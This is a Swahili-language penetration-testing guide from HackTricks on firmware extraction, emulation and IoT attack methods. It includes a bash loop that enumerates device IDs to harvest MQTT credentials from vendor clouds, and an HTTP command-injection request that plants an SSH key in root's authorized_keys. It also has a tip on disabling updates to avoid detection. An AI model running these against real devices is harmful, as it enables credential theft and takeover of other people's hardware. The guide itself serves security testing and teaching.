# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Utangulizi**

### Rasilimali zinazohusiana


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware ni programu muhimu inayowezesha vifaa kufanya kazi vizuri kwa kusimamia na kurahisisha mawasiliano kati ya vipengele vya hardware na programu ambazo watumiaji wanazitumia. Inahifadhiwa katika kumbukumbu ya kudumu, ikihakikisha kifaa kinaweza kupata maagizo muhimu tangu linapowashwa, na kusababisha kuanzishwa kwa mfumo wa uendeshaji. Kuangalia na pengine kubadilisha firmware ni hatua muhimu katika kubaini udhaifu wa usalama.

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua ya awali muhimu katika kuelewa muundo wa kifaa na teknolojia zinazotumika. Mchakato huu unahusisha ukusanyaji wa data kuhusu:

- Miundo ya CPU na mfumo wa uendeshaji unaotumika
- Maelezo maalum ya bootloader
- Mpangilio wa hardware na datasheets
- Vigezo vya codebase na maeneo ya source
- Maktaba za nje na aina za leseni
- Historia za masasisho na vyeti vya udhibiti
- Michoro ya miundo na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni za thamani sana, pamoja na uchambuzi wa sehemu zozote za software za open-source zinazopatikana kupitia mchakato wa ukaguzi wa mikono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa uchambuzi wa static bila malipo ambao unaweza kutumika kugundua matatizo yanayoweza kutokea.

## **Kupata Firmware**

Kupata firmware kunaweza kufanyika kwa njia mbalimbali, kila moja ikiwa na ngazi yake ya ugumu:

- **Moja kwa moja** kutoka kwa chanzo (waendelezaji, watengenezaji)
- **Kujenga** kulingana na maelekezo yaliyotolewa
- **Kupakua** kutoka kwa tovuti rasmi za msaada
- Kutumia maulizo ya **Google dork** kutafuta faili za firmware zilizo hifadhiwa
- Kupata **cloud storage** moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kukatiza **updates** kupitia mbinu za man-in-the-middle
- **Kuchukua** kutoka kwa kifaa kupitia muunganisho kama **UART**, **JTAG**, au **PICit**
- **Sniffing** kwa maombi ya update ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Dumping** kutoka bootloader au network
- **Kuondoa na kusoma** chip ya storage, wakati njia nyingine zote zimefeli, kwa kutumia zana za hardware zinazofaa

## Kuchambua firmware

Sasa baada ya **umepata firmware**, unahitaji kutoa taarifa kuhusu kwake ili kujua jinsi ya kuitendea. Zana tofauti ambazo unaweza kutumia ni:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Iwapo hupata mengi kwa zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`; ikiwa entropy ni ndogo, basi si uwezekano mkubwa kuwa encrypted. Ikiwa entropy ni kubwa, inawezekana kuwa encrypted (au compressed kwa njia fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **faili zilizoingizwa ndani ya firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua faili.

### Kupata Mfumo wa Faili

Kwa zana zilizotajwa hapo juu kama `binwalk -ev <bin>` unapaswa kuwa umeweza **kutoa mfumo wa faili**.\
Binwalk kawaida huichomeka ndani ya **folda iliyoitwa kwa jina la aina ya mfumo wa faili**, ambayo kwa kawaida ni mojawapo ya zifuatazo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Uchimbaji wa Mkono wa Mfumo wa Faili

Mara nyingine, binwalk haitakuwa na **magic byte ya filesystem katika signatures zake**. Katika kesi hizi, tumia binwalk kutafuta **offset ya filesystem na kuchonga mfumo wa faili uliokompresswa** kutoka kwenye binary na **kutoa kwa mkono** mfumo wa faili kulingana na aina yake kwa kutumia hatua hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Endesha **dd command** ifuatayo ili kuchonga Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Kwa mbadala, amri ifuatayo pia inaweza kutumika.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (ilayotumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitapatikana katika saraka "`squashfs-root`" baadaye.

- Faili za archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa filesystem za jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa filesystem za ubifs zenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchambua Firmware

Mara tu firmware itakapopatikana, ni muhimu kuichambua ili kuelewa muundo wake na udhaifu unaowezekana. Mchakato huu unahusisha kutumia zana mbalimbali kuchambua na kutoa data muhimu kutoka kwa firmware image.

### Zana za Uchambuzi wa Awali

Seti ya amri zimewasilishwa kwa ajili ya ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi zina msaada katika kubaini aina za faili, kutoa strings, kuchambua data ya binary, na kuelewa partition na undani wa filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Ili kutathmini hali ya usimbaji ya image, **entropy** inachunguzwa kwa `binwalk -E <bin>`. Entropy ya chini inaashiria ukosefu wa usimbaji, wakati entropy ya juu inaonyesha uwezekano wa usimbaji au compression.

Kwa ajili ya kutoa **embedded files**, zana na rasilimali kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili zinapendekezwa.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kawaida unaweza kutoa filesystem, mara nyingi katika saraka iliyoitwa kwa jina la aina ya filesystem (mfano, squashfs, ubifs). Hata hivyo, wakati **binwalk** inashindwa kutambua aina ya filesystem kwa sababu ya kukosekana kwa magic bytes, uchimbaji wa mikono unahitajika. Hii inahusisha kutumia `binwalk` kupata offset ya filesystem, kisha kutumia amri ya `dd` kuchonga filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Baada yake, kulingana na aina ya filesystem (mfano, squashfs, cpio, jffs2, ubifs), amri tofauti zinatumika kutoa yaliyomo kwa mkono.

### Uchambuzi wa filesystem

Baada ya filesystem kutolewa, utafutaji wa dosari za usalama unaanza. Umakini hutolewa kwa network daemons zisizo salama, hardcoded credentials, API endpoints, utendaji wa update server, code isiyotokana, startup scripts, na compiled binaries kwa uchambuzi wa offline.

**Maeneo muhimu** na **vitu** vya kukagua ni pamoja na:

- **etc/shadow** and **etc/passwd** kwa credentials za watumiaji
- Vyeti za SSL na funguo ndani ya **etc/ssl**
- Faili za configuration na script kwa udhaifu unaowezekana
- Embedded binaries kwa uchambuzi zaidi
- Common IoT device web servers na binaries

Zana kadhaa zinausaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa utafutaji wa taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi kamili wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa static na dynamic analysis

### Security Checks on Compiled Binaries

Zote source code na compiled binaries zinazopatikana ndani ya filesystem lazima zichunguzwe kwa udhaifu. Zana kama **checksec.sh** kwa Unix binaries na **PESecurity** kwa Windows binaries husaidia kutambua binaries zisizo na ulinzi ambazo zinaweza kutumika.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Hubs nyingi za IoT hupakua configuration ya kila kifaa kutoka cloud endpoint inayofanana na:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Wakati wa uchambuzi wa firmware unaweza kugundua kwamba <token> inatokana ndani ya kifaa kutoka device ID ikitumia siri iliyowekwa ndani (hardcoded secret), kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Ubunifu huu unamuwezesha mtu yeyote anayejua deviceId na STATIC_KEY kujenga upya URL na kuvuta cloud config, mara nyingi ikifichua plaintext MQTT credentials na prefixes za topic.

Mchakato wa vitendo:

1) Toa deviceId kutoka logi za boot za UART

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na rekodi logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari inayochapisha cloud config URL pattern na broker address, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Rejesha STATIC_KEY na token algorithm kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na tafuta config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (kwa mfano MD5(deviceId||STATIC_KEY)).
- Pata token kwa Bash na fanya digest kuwa herufi kubwa:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Vuna cloud config na MQTT credentials

- Tengeneza URL na pakua JSON kwa curl; chambua kwa jq ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Dhulumu plaintext MQTT na weak topic ACLs (ikiwa zipo)

- Tumia credentials zilizopatikana kujiandikisha kwenye maintenance topics na kutafuta matukio nyeti:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate predictable device IDs (at scale, with authorization)

- Mifumo mingi huingiza vendor OUI/product/type bytes ikifuatiwa na nyongeza mfululizo.
- Unaweza kurudia candidate IDs, kutengeneza tokens na kupakua configs kwa njia ya programu:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Vidokezo
- Daima pokea idhini wazi kabla ya kujaribu mass enumeration.
- Pendelea emulation au static analysis ili kupata siri bila kubadilisha target hardware pale inapowezekana.

Mchakato wa emulating firmware unawezesha **dynamic analysis** ya uendeshaji wa kifaa au programu binafsi. Mbinu hii inaweza kukutana na changamoto zinazohusiana na tegemezi za hardware au architecture, lakini kuhamisha root filesystem au binaries maalum kwenye kifaa chenye architecture na endianness vinavyolingana, kama Raspberry Pi, au kwenye pre-built virtual machine, kunaweza kuwezesha upimaji zaidi.

### Kuiga Binaries Binafsi

Kwa kuchambua programu moja kwa moja, ni muhimu kutambua endianness ya programu na CPU architecture.

#### Mfano kwa MIPS Architecture

Ili kuiga MIPS architecture binary, unaweza kutumia amri:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha emulation tools zinazohitajika:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), hutumiwa `qemu-mips`, na kwa binaries za little-endian, `qemu-mipsel` ndiyo chaguo.

#### ARM Architecture Emulation

Kwa binaries za ARM, mchakato ni sawa, ikitumia emulator `qemu-arm` kwa emulation.

### Full System Emulation

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyingine, husaidia emulation kamili ya firmware, kuautomate mchakato na kusaidia katika dynamic analysis.

## Dynamic Analysis in Practice

Katika hatua hii, mazingira ya kifaa halisi au yaliyo-emulate hutumiwa kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na filesystem. Emulation inaweza isiige kwa usahihi mwingiliano wa hardware, hivyo mara kwa mara inahitaji kuanzishwa upya. Uchambuzi unapaswa kurudia filesystem, kuchunguza webpages na huduma za mtandao zilizo wazi, na kuchunguza udhaifu wa bootloader. Vipimo vya uadilifu ya firmware ni muhimu kutambua uwezekano wa backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis inahusisha kuingiliana na mchakato au binary ndani ya mazingira yake ya uendeshaji, ukitumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kutambua vulnerabilities kupitia fuzzing na mbinu nyingine.

## Binary Exploitation and Proof-of-Concept

Kuendeleza PoC kwa vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa architecture lengwa na programu kwa lugha za chini ya kiwango. Kinga za runtime za binaries katika mifumo ya embedded ni nadra, lakini zinapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuwa muhimu.

## Prepared Operating Systems for Firmware Analysis

Mifumo ya uendeshaji kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyo tayari yamewekwa kwa ajili ya firmware security testing, yakiwa na zana muhimu.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyoandaliwa kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Inakuokoa muda kwa kutoa mazingira yaliyo tayari yamewekwa na zana zote muhimu.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Hata pale muuzaji anapotekeleza ukaguzi wa saini za cryptographic kwa image za firmware, **kinga dhidi ya version rollback (downgrade) mara nyingi haipo**. Wakati boot- au recovery-loader inathibitisha tu saini kwa public key iliyojengwa ndani lakini haitoi kulinganisha *version* (au monotonic counter) ya image inayo-flash, mshambuliaji anaweza kwa halali kusakinisha **firmware ya zamani yenye udhaifu ambayo bado ina saini halali** na hivyo kurudisha vulnerabilities zilizotengenezwa patch.

Mwendo wa kawaida wa shambulio:

1. **Obtain an older signed image**
   * Pata kutoka kwenye portal ya upakuaji ya vendor, CDN au tovuti ya support.
   * Extract kutoka kwenye companion mobile/desktop applications (mfano ndani ya Android APK chini ya `assets/firmware/`).
   * Pata kutoka kwa repositori za third-party kama VirusTotal, machive za Internet, vikao, n.k.
2. **Upload or serve the image to the device** via any exposed update channel:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya IoT vya watumiaji vinaonyesha endpoints za HTTP(S) zisizo na uthibitisho (*unauthenticated*) zinazokubali firmware blobs zilizo Base64-encoded, kuzitafsiri upande wa server na kusababisha recovery/upgrade.
3. Baada ya downgrade, tumia udhaifu uliopashwa patch katika toleo jipya (kwa mfano filter ya command-injection iliyoongezwa baadaye).
4. Hiari: flash tena image ya hivi karibuni au zima updates ili kuepuka kugunduliwa mara persistence inapopatikana.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo hatarini (iliyoshushwa toleo), parameter ya `md5` imeambatanishwa moja kwa moja katika shell command bila kusafishwa, ikiruhusu kuingizwa kwa amri zozote (hapa – kuwezesha SSH key-based root access). Toleo za baadaye za firmware zililetwa kichujio rahisi cha herufi, lakini kukosekana kwa ulinzi dhidi ya kushusha toleo kunafanya suluhisho hilo lisifae.

### Kutoa Firmware Kutoka kwa Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao za kuambatana za simu ili app iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Paketi hizi kwa kawaida huhifadhiwa bila kusimbwa katika APK/APEX chini ya njia kama `assets/fw/` au `res/raw/`. Vifaa kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuruhusu kutoa picha zilizosainiwa bila kugusa vifaa vya kimwili.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Orodha ya Kukagua Mantiki ya Sasisho

* Je, usafirishaji/uthibitisho wa *update endpoint* umehifadhiwa vya kutosha (TLS + authentication)?
* Je, kifaa kinalinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
* Je, image imethibitishwa ndani ya secure boot chain (e.g. signatures checked by ROM code)?
* Je, userland code inafanya ukaguzi wa ziada wa ustahimilivu (e.g. allowed partition map, model number)?
* Je, *partial* au *backup* update flows zinatumia tena mantiki ile ile ya uthibitisho?

> 💡  Ikiwa chochote kilicho hapo juu kinakosekana, jukwaa linaweza kuwa hatarini kwa rollback attacks.

## Firmware zilizo hatari za kufanya mazoezi

Ili kufanya mazoezi ya kugundua udhaifu katika firmware, tumia miradi ya firmware zilizo hatari hapa chini kama mwanzo.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Marejeo

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Mafunzo na Cheti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
